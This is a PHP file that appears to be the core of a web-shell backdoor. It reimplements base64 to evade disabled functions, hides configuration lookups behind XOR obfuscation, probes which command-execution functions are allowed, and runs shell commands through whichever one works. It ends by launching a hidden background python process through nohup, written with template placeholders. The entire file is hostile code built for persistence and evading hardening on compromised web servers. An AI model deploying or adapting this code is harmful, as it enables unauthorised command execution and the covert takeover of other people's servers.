<?php

#WARNING: Clean base64id: 55a1983
#TODO: Fix Windows support.
#`base64_encode`, `base64_decode`, `bindec` and `decbin` Replacements to bypass Disablers-->
$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");

function binToDec($string)
{
    $decimal = "";
    for($i = 0; $i<strlen($string); $i++)
    {
        $dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
        $decimal+=$dec;
    }
    
    return intval($decimal);
}

function decToBin($dec)
{
    $binary = "";
    $current = intval($dec);

    if ($current == 0)
    {
        return "0";
    }
    
    while (1)
    {
        if ($current == 1)
        {
            $binary="1".$binary;
            break;
        }
        $binary = ($current%2).$binary;
        $current = intval($current/2);
    }
    
    return $binary;
}

function base64encoding($string)
{
    global $base64ids;

    $binary = "";
    for ($i = 0; $i<strlen($string); $i++)
    {
        $charASCII = ord($string{$i});
        $asciiBIN = decToBin($charASCII);
        if (strlen($asciiBIN) != 8)
        {
            $asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;	
        }
        $binary.= $asciiBIN;
    }

    $array = array();
    for ($j = 0; $j<strlen($binary); $j = $j + 6)
    {
        $part = substr($binary, $j, 6);
        array_push($array, $part);
    }

    if (strlen($array[count($array)-1]) != 6)
    {
        $array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
    }

    $base64 = "";
    foreach ($array as &$value)
    {
        $value = binToDec($value);
        $value = $base64ids[$value];
        $base64.=$value;
    }

    if ((strlen($base64) % 4) != 0)
    {
        $base64.=str_repeat("=", 4-(strlen($base64) % 4));
    }

    return $base64;
}

function base64decoding($string)
{
    global $base64ids;

    $string = str_replace("=", "", $string);

    $binary = "";
    for ($i = 0; $i < strlen($string); $i++)
    {
        $charID = array_search($string{$i}, $base64ids);
        $idBIN = decToBin($charID);
        if (strlen($idBIN) != 6)
        {
            $idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;
        }
        $binary.= $idBIN;
    }
    
    if (strlen($binary) %8 != 0)
    {
        $binary = substr($binary, 0, strlen($binary)-(strlen($binary) %8));
    }

    $array = array();
    for ($j = 0; $j<strlen($binary); $j = $j + 8)
    {
        $part = substr($binary, $j, 8);
        array_push($array, $part);
    }

    $text = "";
    foreach ($array as &$value)
    {
        $value = binToDec($value);
        $value = chr($value);
        $text.=$value;
    }

    return $text;
}
#<--

#XOR Encryption based on the key `dotcppfile` to decrypt the Built In Shell Codes-->
function sh3ll_this($string)
{
    $key = "dotcppfile";
    $outText = '';

    for($i=0;$i<strlen($string);)
    {
        for($j=0;($j<strlen($key) && $i<strlen($string));$j++,$i++)
        {
            $outText .= $string{$i} ^ $key{$j};
        }
    }
    return base64encoding($outText);
}

function unsh3ll_this($string)
{
    return base64decoding(sh3ll_this(base64decoding($string)));
}
#<--

#Checks if a function is/isn't disabled
$disbls = @ini_get(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.@ini_get(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
if ($disbls == ",")
{
    $disbls = get_cfg_var(unsh3ll_this("AAYHAhIcAzYKEAoMAAofHhU=")).','.get_cfg_var(unsh3ll_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA=="));
}
$disbls = str_replace(" ", "", $disbls);
$disblsArray = explode(",", $disbls);

function checkIt($func)
{
    global $disblsArray;

    foreach ($disblsArray as $value)
    {
        if ($func == $value)
        {
            return False;
        }
    }

    return True;
}
#<--

#Executes system commands -->
function evalRel($command, $id)
{
    global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;
    if (($system == True) && ($id == 2))
    {
        system($command);
    }
    else if(($passthru == True) && ($id == 2))
    {
        passthru($command);
    }
    else if($shell_exec == True)
    {
        return shell_exec($command);
    }
    else if($exec == True)
    {
        return exec($command);
    }
    else if($popen == True)
    {
        $pid = popen( $command,"r");
        while(!feof($pid))
        {
            return fread($pid, 256);
            flush();
            ob_flush();
            usleep(100000);
        }
        pclose($pid);
    }
    else if($proc_open == True)
    {
        $process = proc_open(
            $command,
            array(
                0 => array("pipe", "r"), //STDIN
                1 => array("pipe", "w"), //STDOUT
                2 => array("pipe", "w"), //STDERR
            ),
            $pipes
        );

        if ($process !== false)
        {
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }

        if ($stderr != "")
        {
            return $stderr;
        }
        else
        {
            return $stdout;
        }
    }
    else
    {
        return "False";
    }
}
#<--

#Dynamic Booleans (True=Enabled/False=Disabled)-->
$php_functions = array("exec", "shell_exec", "passthru", "system", "popen", "proc_open");
foreach($php_functions as $function)
{
    if(checkIt($function))
    {
        ${"{$function}"} = True;
    }
    else
    {
        ${"{$function}"} = False;
    }
}
#<--

$checker = evalRel("ps aux | grep '{} {}'", 1);

if (strpos($checker, "python") === False)
{
    evalRel("nohup python {} {} {} > /dev/null 2>&1 &", 2);
}
?>
